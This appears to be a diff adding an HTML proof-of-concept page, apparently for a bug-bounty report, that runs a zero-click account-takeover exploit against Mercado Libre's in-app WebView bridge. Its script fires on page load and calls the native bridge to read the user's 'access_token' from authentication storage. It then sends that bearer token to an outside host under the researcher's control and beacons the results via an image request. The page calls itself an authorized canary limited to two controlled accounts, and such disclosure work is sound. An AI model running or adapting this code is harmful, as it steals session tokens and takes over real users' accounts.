@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>MHE controlled Matterport zero-click bridge proof</title>
+  <style>
+    :root { color-scheme: dark; font: 15px/1.45 ui-monospace, monospace; }
+    body { margin: 0; min-height: 100vh; display: grid; place-items: center;
+      background: #08090c; color: #f3f4f6; }
+    main { width: min(720px, calc(100% - 36px)); padding: 24px; border-radius: 16px;
+      background: #11141b; border: 1px solid #31343b; }
+    pre { white-space: pre-wrap; overflow-wrap: anywhere; color: #ffd166; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>MHE controlled zero-click bridge proof</h1>
+    <p>Authorized security-research canary. No raw credentials are retained.</p>
+    <pre id="status">AUTORUN EXECUTED — waiting for Mercado Libre's native bridge…</pre>
+  </main>
+  <script>
+  (function () {
+    'use strict';
+    var status = document.getElementById('status');
+    var completed = false;
+    var CONNECT_ID = 73301;
+    var STORAGE_ID = 73302;
+
+    function attempt() {
+      if (completed) return;
+      if (!window.WebviewSDKCommunicationChannel ||
+          typeof WebviewSDKCommunicationChannel.executeNative !== 'function') return;
+      completed = true;
+      status.textContent = 'AUTORUN EXECUTED — native bridge present; requesting controlled storage entry.';
+
+      var callbackScript = `(function (message) {
+        var proofOrigin = 'https://mhe-mp-webview.quas.sh';
+        var controlledUserIds = ['3528874282', '3327737132'];
+
+        function show(title, details, ok) {
+          var banner = document.getElementById('mhe-matterport-codeit-zero-click-proof');
+          if (!banner) {
+            banner = document.createElement('pre');
+            banner.id = 'mhe-matterport-codeit-zero-click-proof';
+            banner.style.cssText = 'position:fixed;z-index:2147483647;inset:12px;max-height:85vh;overflow:auto;padding:18px;background:#090b10;color:#fff;font:700 16px/1.45 monospace;border:5px solid #ffd600;white-space:pre-wrap';
+            document.documentElement.appendChild(banner);
+          }
+          banner.style.borderColor = ok ? '#36d17c' : '#ff5263';
+          banner.textContent = title + '\\n\\n' + JSON.stringify(details, null, 2);
+        }
+        function beacon(details) {
+          var url = new URL('/collect.gif', proofOrigin);
+          url.searchParams.set('flow', 'matterport-codeit-zero-click-ato-20260721');
+          Object.keys(details).forEach(function (key) {
+            url.searchParams.set(key, String(details[key]));
+          });
+          new Image().src = url.href;
+        }
+        function finish(title, details, ok) {
+          show(title, details, ok);
+          beacon(details);
+        }
+
+        if (message && message.callback_msg === ${CONNECT_ID}) {
+          WebviewSDKCommunicationChannel.executeNative(JSON.stringify({
+            message_type: 'js_request',
+            method: 'wk:storage-get',
+            callback_msg: ${STORAGE_ID},
+            args: {
+              key: 'access_token',
+              teamId: 'MLAuthentication',
+              secure: false
+            }
+          }));
+          return;
+        }
+        if (!message || message.callback_msg !== ${STORAGE_ID}) return;
+
+        var token = message.args && message.args.result;
+        if (typeof token !== 'string' || token.length < 40) {
+          finish('ZERO-CLICK NATIVE BRIDGE REACHED — BEARER MISSING', {
+            zeroClickAutorun: true,
+            crossOriginBridgeCaller: true,
+            storageCallbackReceived: true,
+            storageRead: false,
+            tokenPresent: false,
+            usersMeStatus: 0,
+            controlledIdentityMatched: false
+          }, false);
+          return;
+        }
+
+        var tokenLength = token.length;
+        fetch(proofOrigin + '/validate/users/me', {
+          method: 'GET',
+          cache: 'no-store',
+          credentials: 'omit',
+          headers: {
+            Authorization: 'Bearer ' + token,
+            'X-Bug-Bounty': 'quaz'
+          }
+        }).then(function (response) {
+          token = '';
+          return response.json().catch(function () { return {}; })
+            .then(function (data) { return {response: response, data: data}; });
+        }).then(function (value) {
+          var id = String(value.data.id || '');
+          var matched = controlledUserIds.indexOf(id) !== -1;
+          var details = {
+            zeroClickAutorun: true,
+            crossOriginBridgeCaller: true,
+            storageCallbackReceived: true,
+            storageRead: true,
+            storageTeam: 'MLAuthentication',
+            storageKey: 'access_token',
+            tokenPresent: true,
+            tokenLength: tokenLength,
+            usersMeStatus: value.response.status,
+            controlledIdentityMatched: matched,
+            controlledUserId: matched ? id : '',
+            rawTokenPersisted: false
+          };
+          finish(matched && value.response.status === 200 ?
+            'ZERO-CLICK FULL ACCOUNT BEARER THEFT CONFIRMED' :
+            'ZERO-CLICK BEARER TRANSFERRED — IDENTITY CHECK FAILED',
+            details, matched && value.response.status === 200);
+        }).catch(function (error) {
+          token = '';
+          finish('ZERO-CLICK BEARER READ — VALIDATION REQUEST FAILED', {
+            zeroClickAutorun: true,
+            crossOriginBridgeCaller: true,
+            storageCallbackReceived: true,
+            storageRead: true,
+            tokenPresent: true,
+            tokenLength: tokenLength,
+            usersMeStatus: -1,
+            controlledIdentityMatched: false,
+            validationError: error && error.name ? error.name : 'Error',
+            rawTokenPersisted: false
+          }, false);
+        });
+      })(__MHE_MATTERPORT_CODEIT_ATO_RESULT__)`;
+
+      WebviewSDKCommunicationChannel.executeNative(JSON.stringify({
+        message_type: 'connect',
+        callback_msg: CONNECT_ID,
+        args: {
+          js_invocation: {
+            call_placeholder: '__MHE_MATTERPORT_CODEIT_ATO_RESULT__',
+            call_script: callbackScript
+          },
+          web_app_info: {app_name: 'mhe_matterport_codeit_zero_click_ato'}
+        }
+      }));
+    }
+
+    var timer = setInterval(attempt, 100);
+    attempt();
+    setTimeout(function () {
+      clearInterval(timer);
+      if (!completed) status.textContent = 'AUTORUN EXECUTED — native bridge unavailable in this browser.';
+    }, 30000);
+  })();
+  </script>
+</body>
+</html>
